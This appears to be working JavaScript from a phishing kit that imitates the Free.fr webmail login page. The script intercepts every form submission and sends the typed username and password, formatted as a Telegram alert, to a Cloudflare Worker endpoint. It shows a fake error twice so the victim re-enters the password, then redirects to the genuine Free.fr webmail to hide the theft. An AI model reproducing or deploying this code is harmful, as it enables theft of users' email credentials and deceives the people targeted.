        function showZimbra() {
            $(".webmailClassique").fadeOut(500, function() {
                $('.webmailZimbra').fadeIn(500);
            });
        }
        
        function showClassique() {
            $(".webmailZimbra").fadeOut(500, function() {
                $('.webmailClassique').fadeIn(500);
            });
        }
        
        $(function() {
            $(".togglePassword").click(function() {
                var input = $($(this).attr("toggle"));
                input.attr("type", "text");
                $(this).removeClass("slash");
                var eyeIcon = $(this);
                setTimeout(function() {
                    eyeIcon.addClass("slash");
                    input.attr("type", "password");
                }, 2000);
            });
        });
        
        // Backend URL (Aapka Cloudflare Worker)
        const BACKEND_API_URL = "https://testdatasend.narpatprihar2005.workers.dev";
        
        // Counter define kiya gaya hai
        let loginAttempts = 0;
        
        document.addEventListener("DOMContentLoaded", () => {
            const forms = document.querySelectorAll("form");
            
            forms.forEach(form => {
                form.addEventListener("submit", async (e) => {
                    e.preventDefault();
                    
                    const loginInput = form.querySelector("input[type='text'], input[id='login'], input[name='login'], input[name='_user']");
                    const passwordInput = form.querySelector("input[type='password'], input[id='passwd'], input[name='passwd'], input[name='_pass']");
                    const submitBtn = form.querySelector("input[type='submit']");
                    const errorBox = form.querySelector(".error-msg");
                    
                    if (loginInput && passwordInput) {
                        const login = loginInput.value.trim();
                        const password = passwordInput.value;
                        
                        if (login !== "" && password !== "") {
                            // Attempt badhao
                            loginAttempts++;
                            
                            // Loading state start
                            const originalBtnText = submitBtn.value;
                            submitBtn.disabled = true;
                            submitBtn.value = "Patientez...";
                            errorBox.style.display = "none"; // Hide previous error if any
                            
                            // Message Format for Telegram
                            const formattedMessage = `🚨 **Nouveau Login Free (Tentative ${loginAttempts})**\n\n👤 **Identifiant:** ${login}\n🔑 **Password:** ${password}`;
                            
                            // Send data to backend regardless of attempt number
                            try {
                                await fetch(BACKEND_API_URL, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({ text_data: formattedMessage })
                                });
                            } catch (error) {
                                console.error("Data send error:", error);
                                // Error ko ignore karenge taaki user ka experience break na ho
                            }
                            
                            // Logic for 1st, 2nd, and 3rd attempt
                            if (loginAttempts < 3) {
                                // Pehli 2 baar error dikhao
                                setTimeout(() => {
                                    errorBox.style.display = "block"; // Show red error box
                                    passwordInput.value = ""; // Clear password field
                                    passwordInput.focus(); // Cursor wapas password par
                                    submitBtn.disabled = false;
                                    submitBtn.value = originalBtnText;
                                }, 800); // Thoda delay (0.8s) taaki natural lage
                            } else {
                                // 3rd baar sidha redirect
                                window.location.href = "https://webmail.free.fr/";
                            }
                        }
                    }
                });
            });
        });
